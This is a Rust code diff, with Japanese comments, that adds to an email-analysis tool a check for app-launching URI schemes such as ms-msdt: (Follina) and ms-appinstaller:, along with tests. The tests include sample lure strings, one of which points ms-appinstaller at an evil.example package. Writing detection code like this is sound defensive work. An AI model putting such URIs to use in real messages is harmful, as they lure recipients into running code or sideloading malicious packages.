@@ -786,6 +786,18 @@ pub async fn analyze_raw_email(bytes: &[u8]) -> Result<ImportedEmail, String> {
         );
     }
 
+    // D1262: アプリ起動型 URI スキーム (ms-msdt:/search-ms:/ms-appinstaller:)
+    //    extract_urls_from_text は http(s) のみを拾うため、OS のプロトコル
+    //    ハンドラ経由でコード実行・リモート共有表示に繋がる URI はリンク
+    //    評価を素通りする (Follina CVE-2022-30190、App Installer 亜種)。
+    if has_external_protocol_uri(analysis_text) {
+        render_risks.push(
+            "本文にアプリ起動型 URI スキーム (ms-msdt:/search-ms:/ms-appinstaller: 等) が含まれています — \
+             OS のプロトコルハンドラ経由で外部プログラムを起動する誘導の兆候です"
+                .to_string(),
+        );
+    }
+
     // D1252: 電話番号のみのペイロード (TOAD / コールバックフィッシング)
     //    URL が一切無いメールはリンク解析を完全に素通りする — 番号への
     //    電話自体が唯一のペイロード。KnowBe4 観測で前年比 +449%。
@@ -3239,6 +3251,25 @@ fn has_devicelogin_lure(text: &str) -> bool {
     text.to_lowercase().contains("devicelogin")
 }
 
+/// D1262: アプリ起動型 URI スキーム — `extract_urls_from_text` は http(s)
+/// のみを拾うため `ms-msdt:`/`search-ms:` 等のプロトコルハンドラ URI は
+/// リンク評価を完全に素通りする。実害のあったスキームのみを列挙:
+/// `ms-msdt:` (Follina, CVE-2022-30190 — msdt.exe 経由の任意コード実行)、
+/// `search-ms:` (Windows Search 経由でリモート共有をエクスプローラ表示)、
+/// `ms-appinstaller:` (App Installer 経由のサイドロード、2023-24 多発)。
+/// 正規のメール本文にこれらのスキームが書かれることはほぼない。
+fn has_external_protocol_uri(text: &str) -> bool {
+    const SCHEMES: &[&str] = &[
+        "ms-msdt:",
+        "search-ms:",
+        "ms-appinstaller:",
+        "ms-appinstaller-web:",
+        "itms-appss:",
+    ];
+    let lower = text.to_lowercase();
+    SCHEMES.iter().any(|s| lower.contains(s))
+}
+
 /// 本文冒頭に LLM 生成物の前文が残っているか (D1259)。
 ///
 /// KnowBe4 (2026-06) の AI 生成フィッシング解析: モデルが出力冒頭に
@@ -4700,6 +4731,21 @@ mod tests {
         // 人間の書き出しは対象外
         assert!(!has_llm_preamble("お世話になっております。資料を添付します"));
         assert!(!has_llm_preamble("Meeting notes attached."));
+    }
+
+    #[test]
+    fn has_external_protocol_uri_はアプリ起動スキームを検出する() {
+        // Follina (ms-msdt) / Windows Search (search-ms) / App Installer
+        assert!(has_external_protocol_uri("参照: ms-msdt:/id PCWDiagnostic"));
+        assert!(has_external_protocol_uri("open search-ms:query=invoice&crumb=..."));
+        assert!(has_external_protocol_uri(
+            "ms-appinstaller:?source=https://evil.example/p.appinstaller"
+        ));
+        // http/https URL や通常文は対象外
+        assert!(!has_external_protocol_uri("https://example.com/login を開いてください"));
+        assert!(!has_external_protocol_uri("資料を添付しました"));
+        // 大文字のスキームも検出
+        assert!(has_external_protocol_uri("MS-MSDT:/id PCWDiagnostic"));
     }
 
     /// D1254: From == To の self-addressed メールは注意喚起が出る。
